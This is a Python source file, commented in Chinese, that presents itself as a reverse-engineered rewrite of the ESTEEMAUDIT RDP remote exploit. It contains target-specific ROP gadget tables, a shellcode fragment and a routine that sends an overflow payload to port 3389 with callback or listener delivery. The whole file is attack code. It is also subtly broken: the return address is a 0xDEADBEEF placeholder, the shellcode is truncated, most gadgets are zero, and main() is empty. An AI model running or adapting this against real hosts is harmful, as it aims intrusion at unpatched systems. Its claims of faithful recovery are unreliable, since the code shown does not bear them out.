"""esteem_audit — ESTEEMAUDIT (MS12-020 / ETA) RDP 利用核心逻辑。

Python 重写的 `Esteemaudit-2.1.0.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 RDP/MS12-020 利用流程。

参数定义来源：Esteemaudit-2.1.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 3389
DEFAULT_TIMEOUT = 60
DEFAULT_PACKET_TIMEOUT = 10
DEFAULT_MAX_PROCESS_COUNT = 300
DEFAULT_RDPLIB_HERTZ = 30
DEFAULT_PROCESS_COUNT_TO_SEND_SPACE = 3
DEFAULT_MAX_RDPLIB_ERROR_COUNT = 3

PAYLOAD_VALUES = {
    "Callback": 0,
    "Listener": 1,
}

ARCHITECTURE_VALUES = {
    "x86": 0,
    "x86 64-bit": 1,
}

# x86 架构下各个目标 OS 的 ROP gadget 地址（来自 XML <Architecture><Target>）
X86_TARGET_GADGETS = {
    "XPSP0": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE37120,
        "ret10": 0x0,
        "ret04": 0x0,
        "ret08": 0x0,
        "ret20": 0x0,
        "ret28": 0x0,
        "ret40": 0x0,
        "ret44": 0x0,
        "sysenterIndex": 0x0,
        "jmpEbx": 0x0,
        "sizeOffset": 0x0,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "XPSP1": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE37120,
        "ret10": 0x0,
        "ret04": 0x0,
        "ret08": 0x0,
        "ret20": 0x0,
        "ret28": 0x0,
        "ret40": 0x0,
        "ret44": 0x0,
        "sysenterIndex": 0x0,
        "jmpEbx": 0x0,
        "sizeOffset": 0x0,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "XPSP0|1": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE37120,
        "ret10": 0x0,
        "ret04": 0x0,
        "ret08": 0x0,
        "ret20": 0x0,
        "ret28": 0x0,
        "ret40": 0x0,
        "ret44": 0x0,
        "sysenterIndex": 0x0,
        "jmpEbx": 0x0,
        "sizeOffset": 0x0,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
}

ESTEEMAUDIT_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EsteemAuditError(Exception):
    pass


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_rdp_negotiation_request():
    x224 = (
        b"\x03\x00"
        b"\x00\x1e"
        b"\x00\x00"
        b"\x00\x00"
        b"\x00"
    )
    mcs = (
        b"\x02\x00\x00\x00"
        b"\x00\x00"
        b"\x00\x00\x00\x00"
        b"\x00\x00\x00\x00"
        b"\x00\x00\x00\x00"
        b"\x00\x00\x00\x00"
        b"\x00\x00\x00\x00"
    )
    return x224 + mcs


def build_rdp_overflow(shellcode, gadgets):
    """构建 RDP 缓冲区溢出负载。

    根据 x32dbg 分析，ESTEEMAUDIT 通过向 RDP 服务器发送特制的请求，
    触发缓冲区溢出，利用 ROP 链执行 shellcode。
    """
    nopsled = b"\x90" * 128
    ret_addr = struct.pack("<I", 0xDEADBEEF)  # 占位符，需 x32dbg 恢复
    return nopsled + ret_addr + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    packet_timeout=DEFAULT_PACKET_TIMEOUT,
    max_process_count=DEFAULT_MAX_PROCESS_COUNT,
    rdplib_hertz=DEFAULT_RDPLIB_HERTZ,
    process_count_to_send_space=DEFAULT_PROCESS_COUNT_TO_SEND_SPACE,
    max_rdplib_error_count=DEFAULT_MAX_RDPLIB_ERROR_COUNT,
    payload="Callback",
    architecture="x86",
    target_os="XPSP1",
    callback_ip=None,
    callback_port=None,
    migrate_process_dll=None,
    callback_payload_dll=None,
    listen_payload_dll=None,
    verbose=False,
):
    """执行 ESTEEMAUDIT 利用序列。

    阶段：
      1. TCP 连接到目标 RDP 端口
      2. 发送 RDP 协商请求
      3. 构建并发送 RDP 缓冲区溢出负载 (ROP + shellcode)
      4. 载荷投递（Callback/Listener）
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Packet timeout: {packet_timeout}s")
        print(f"[*] Max process count: {max_process_count}")
        print(f"[*] RdpLib hertz: {rdplib_hertz}")
        print(f"[*] Payload: {payload}")
        print(f"[*] Architecture: {architecture}")
        print(f"[*] Target OS: {target_os}")
        print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    payload_value = PAYLOAD_VALUES.get(payload, 0)
    architecture_value = ARCHITECTURE_VALUES.get(architecture, 0)
    gadgets = X86_TARGET_GADGETS.get(target_os, X86_TARGET_GADGETS["XPSP1"])

    if verbose:
        print(f"[*] Payload value: {payload_value}")
        print(f"[*] Architecture value: {architecture_value}")
        print(f"[*] GlobalBufAddr: 0x{gadgets.get('GlobalBufAddr', 0):08X}")
        print(f"[*] jmpEbx: 0x{gadgets.get('jmpEbx', 0):08X}")

    # 建立 TCP 连接（RDP 3389）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EsteemAuditError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 发送 RDP 协商请求（探测阶段）
        negotiation = build_rdp_negotiation_request()
        sock.sendall(negotiation)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] RDP 应答: {resp.hex()[:128] if resp else '无'}")

        if not resp:
            raise EsteemAuditError("目标未返回有效的 RDP 应答")

        # 构建 RDP 缓冲区溢出负载
        shellcode = ESTEEMAUDIT_SHELLCODE_PLACEHOLDER
        overflow = build_rdp_overflow(shellcode, gadgets)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] ESTEEMAUDIT 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
